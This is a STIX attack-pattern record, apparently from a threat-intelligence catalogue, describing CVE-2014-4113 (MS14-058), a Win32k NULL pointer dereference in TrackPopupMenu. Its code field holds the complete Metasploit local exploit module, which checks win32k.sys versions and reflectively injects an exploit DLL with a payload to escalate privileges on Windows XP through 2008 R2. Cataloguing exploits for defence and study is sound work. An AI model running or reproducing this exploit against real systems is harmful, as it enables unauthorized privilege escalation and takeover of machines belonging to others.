{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--95db8e7e-8995-40bd-aebe-d2ffcdadb8a6",
    "created": "2024-08-14T16:49:40.910453Z",
    "modified": "2024-08-14T16:49:40.910457Z",
    "name": "Windows TrackPopupMenu Win32k NULL Pointer Dereference",
    "description": " This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability can be triggered through the use of TrackPopupMenu. Under special conditions, the NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary code execution. This module has been tested successfully on Windows XP SP3, Windows 2003 SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 and Windows 2008 R2 SP1 64 bits.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms14_058_track_popup_menu.rb",
            "external_id": "ms14_058_track_popup_menu.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4113"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows TrackPopupMenu Win32k NULL Pointer Dereference',\n          'Description' => %q{\n            This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability\n            can be triggered through the use of TrackPopupMenu. Under special conditions, the\n            NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary\n            code execution. This module has been tested successfully on Windows XP SP3, Windows\n            2003 SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 and Windows\n            2008 R2 SP1 64 bits.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Unknown', # vulnerability discovery and exploit in the wild\n            'juan vazquez', # msf module (x86 target)\n            'Spencer McIntyre', # msf module (x64 target)\n            'OJ Reeves <oj[at]buffered.io>'\n          ],\n          'Arch' => [ ARCH_X86, ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            # Tested on (32 bits):\n            # * Windows XP SP3\n            # * Windows 2003 SP2\n            # * Windows 7 SP1\n            # * Windows 2008\n            [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n            # Tested on (64 bits):\n            # * Windows 7 SP1\n            # * Windows 2008 R2 SP1\n            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            ['CVE', '2014-4113'],\n            ['OSVDB', '113167'],\n            ['BID', '70364'],\n            ['MSB', 'MS14-058'],\n            ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/']\n          ],\n          'DisclosureDate' => '2014-10-14',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [ CRASH_OS_RESTARTS, ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return Exploit::CheckCode::Safe\n    end\n\n    file_path = expand_path('%windir%') << '\\\\system32\\\\win32k.sys'\n    major, minor, build, revision, branch = file_version(file_path)\n    vprint_status(\"win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")\n\n    # Neither target suports Windows 8 or 8.1\n    return Exploit::CheckCode::Safe if build == 9200\n    return Exploit::CheckCode::Safe if build == 9600\n\n    return Exploit::CheckCode::Appears if [2600, 3790, 7600, 7601].include?(build)\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86\n      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    print_status('Reflectively injecting the exploit DLL and triggering the exploit...')\n    if target.arch.first == ARCH_X86\n      dll_file_name = 'cve-2014-4113.x86.dll'\n    else\n      dll_file_name = 'cve-2014-4113.x64.dll'\n    end\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-4113', dll_file_name),\n      encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-14",
    "x_mitre_platforms": [
        "win'"
    ]
}